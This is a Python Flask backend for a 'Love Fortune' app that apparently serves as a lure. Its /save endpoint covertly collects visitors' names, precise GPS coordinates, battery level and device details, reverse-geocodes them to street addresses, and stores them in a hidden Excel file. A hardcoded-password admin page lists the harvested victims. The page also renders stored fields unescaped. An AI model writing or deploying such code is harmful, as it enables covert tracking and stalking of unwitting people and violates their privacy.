from flask import Flask, request, jsonify, abort
from flask_cors import CORS
import pandas as pd
import requests
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

EXCEL_FILE = '/tmp/fortunes_data.xlsx'  # Hidden server path - NOT public!
ADMIN_PASSWORD = 'admin123'  # YOUR SECRET PASSWORD

def init_excel():
    if not os.path.exists(EXCEL_FILE):
        df = pd.DataFrame(columns=['timestamp', 'name', 'latitude', 'longitude', 'accuracy', 'address', 'battery', 'userAgent', 'screen'])
        df.to_excel(EXCEL_FILE, index=False)

def geocode_reverse(lat, lon):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
        resp = requests.get(url, headers={'User-Agent': 'LoveTeller/1.0'})
        return resp.json().get('display_name', 'Hidden')
    except:
        return 'Private'

@app.route('/')
def home():
    return "💕 Love Fortune Backend - Data Captured Privately"

@app.route('/save', methods=['POST'])
def save_data():
    init_excel()
    data = request.json
    
    address = geocode_reverse(data['latitude'], data['longitude'])
    
    new_row = pd.DataFrame([{
        'timestamp': datetime.now().isoformat(),
        'name': data['name'],
        'latitude': data['latitude'],
        'longitude': data['longitude'],
        'accuracy': data['accuracy'],
        'address': address,
        'battery': data['battery'],
        'userAgent': data['userAgent'],
        'screen': data['screen']
    }])
    
    df = pd.read_excel(EXCEL_FILE)
    df = pd.concat([df, new_row], ignore_index=True)
    df.to_excel(EXCEL_FILE, index=False)  # SAVES DIRECTLY TO HIDDEN FILE
    
    return jsonify({'saved': True})

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    # PASSWORD CHECK - NO URL GUESSING
    if request.method == 'GET':
        return '''
        <form method="POST">
            <h2>🔒 Private Admin</h2>
            <input name="password" type="password" placeholder="Password">
            <button>Login</button>
        </form>
        '''
    
    if request.form.get('password') != ADMIN_PASSWORD:
        abort(403)
    
    # SHOW DATA TABLE - NO DOWNLOAD LINK
    df = pd.read_excel(EXCEL_FILE)
    html = f'''
    <h1>💋 PRIVATE DATA ({len(df)} entries)</h1>
    <table border="1" style="border-collapse:collapse;width:100%;font-family:monospace;">
        <tr style="background:#ff1493;color:white;">
            <th>Time</th><th>Name</th><th>GPS</th><th>Address</th><th>Battery</th><th>Device</th>
        </tr>
    '''
    for _, row in df.iterrows():
        gps = f"{row['latitude']:.4f}, {row['longitude']:.4f}"
        html += f'''
        <tr>
            <td>{row['timestamp'][:19]}</td>
            <td>{row['name']}</td>
            <td>{gps}</td>
            <td>{row['address'][:50]}...</td>
            <td>{row['battery']}</td>
            <td>{row['screen']} - {row['userAgent'][:30]}...</td>
        </tr>
        '''
    html += '</table><p><a href="/admin">Refresh</a></p>'
    return html

if __name__ == '__main__':
    init_excel()
    app.run(host='0.0.0.0', port=5000)
